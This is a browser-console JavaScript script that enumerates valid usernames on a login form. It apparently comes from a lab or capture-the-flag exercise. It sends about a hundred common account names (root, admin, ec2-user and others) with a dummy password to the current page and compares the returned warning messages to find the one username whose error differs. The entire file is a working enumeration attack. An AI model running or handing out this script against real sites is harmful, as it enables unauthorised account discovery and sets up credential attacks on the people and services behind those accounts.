const usernames = [
    "root",
    "admin",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "user",
    "administrator",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser",
    "academico",
    "acceso",
    "access",
    "accounting",
    "accounts",
    "acid",
    "activestat",
    "ad",
    "adam",
    "adkit",
    "admin",
    "administracion",
    "administrador",
    "administrator",
    "administrators",
    "admins",
    "ads",
    "adserver",
    "adsl",
    "ae",
    "af",
    "affiliate",
    "affiliates",
    "afiliados",
    "ag",
    "agenda",
    "agent",
    "ai",
    "aix",
    "ajax",
    "ak",
    "akamai",
    "al",
    "alabama",
    "alaska",
    "albuquerque",
    "alerts",
    "alpha",
    "alterwind",
    "am",
    "amarillo",
    "americas",
    "an",
    "anaheim",
    "analyzer",
    "announce",
    "announcements",
    "antivirus",
    "ao",
    "ap",
    "apache",
    "apollo",
    "app",
    "app01",
    "app1",
    "apple",
    "application",
    "applications",
    "apps",
    "appserver",
    "aq",
    "ar",
    "archie",
    "arcsight",
    "argentina",
    "arizona",
    "arkansas",
    "arlington",
    "as",
    "as400",
    "asia",
    "asterix",
    "at",
    "athena",
    "atlanta",
    "atlas",
    "att",
    "au",
    "auction",
    "austin",
    "auth",
    "auto",
    "autodiscover"
]

let formData = new FormData()
formData.set("password", "attack")

const url = window.location.href

let errorMessages = []

for(let i = 0; i < usernames.length; i++) {
    const username = usernames[i];
    formData.set("username", username)
    errorMessages.push(
        fetch(url, {
            method: 'POST',
            body: formData
        })
        .then(res => res.text())
        .then((res) => {
            let html = document.createElement("html")
            html.innerHTML = res
            return html.getElementsByClassName("is-warning")[0].innerText
        })            
    )
}

errorMessages = await Promise.all(errorMessages)

function filterUnique(value, index, self) {
  return self.indexOf(value) === index;
}

uniqueMessages = errorMessages.filter(filterUnique)
uniqueMessages.sort()

// The unique message that corresponds to the correct username
uniqueMessage = uniqueMessages[0]

console.log("Correct username: " + usernames[errorMessages.indexOf(uniqueMessage)])
